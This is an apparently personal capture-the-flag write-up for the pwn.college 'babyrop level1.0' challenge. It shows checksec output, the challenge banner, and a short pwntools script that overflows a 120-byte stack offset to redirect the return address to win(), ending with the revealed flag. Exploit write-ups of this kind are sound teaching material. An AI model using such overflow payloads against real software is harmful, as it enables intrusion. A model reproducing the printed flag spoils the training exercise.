# ROP WriteUP

## Setup

first we already have the all tools, like vscode, pwntools and others.

the guide to ROP is actually three things

1. Check security
2. Find the return address
3. Craft payload

## Babyrop 1.0

for this problem first i check the security using `checksec` from `pwn` modules

```
[*] '/challenge/babyrop_level1.0'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

because the NX enabled we can't craft a shell code and if we look the PIE is disabled so it should be pretty easy. the challenges is available in the /challenge/babyrop_level1. just run ./babyrop_level1.0 and it gives me

```
###
### Welcome to ./babyrop_level1.0!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there is a win() function.
win() will open the flag and send its data to stdout; it is at 0x4024f9.
In order to get the flag, you will need to call this function.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7ffc526ad908, 120 bytes after the start of your input buffer.
That means that you will need to input at least 128 bytes (96 to fill the buffer,
24 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

Received 1 bytes! This is potentially -15 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 4294967282 gadgets of ROP chain at 0x7ffc526ad908.

Leaving!
### Goodbye!
```

after i read the text it just basic overwrite return address. and it even gives me the offset. so i craft the payload

```py
from pwn import *

binary_name = "/challenge/babyrop_level1.0"

p = process(binary_name)

payload = cyclic(120)
payload += p64(0x00000000004024f9)

print(payload)
p.recvuntil(b"address).")
p.sendline(payload)
p.interactive()
```

becuase the 128bytes is including return address so we must subtract it by 8 bytes so the offset is actually 120bytes and we got the flag

```
hacker@babyrop_level1:~/babyrop1.0$ python payload.py
[+] Starting local process '/challenge/babyrop_level1.0': pid 273
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab\xf9$@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode

[*] Process '/challenge/babyrop_level1.0' stopped with exit code -11 (SIGSEGV) (pid 273)
Received 129 bytes! This is potentially 1 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 2 gadgets of ROP chain at 0x7ffcdca74d28.
| 0x00000000004024f9: endbr64  ; push rbp ; mov rbp, rsp ; lea rdi, [rip + 0xc90] ; call 0x401150 ; 
| 0x000000000000000a: (UNMAPPED MEMORY)

Leaving!
You win! Here is your flag:
pwn.college{46d2mczXGy6QmtzEHi5g5RNHKdq.QXxQzMsATO1QzW}
```


# Made by gawrgare
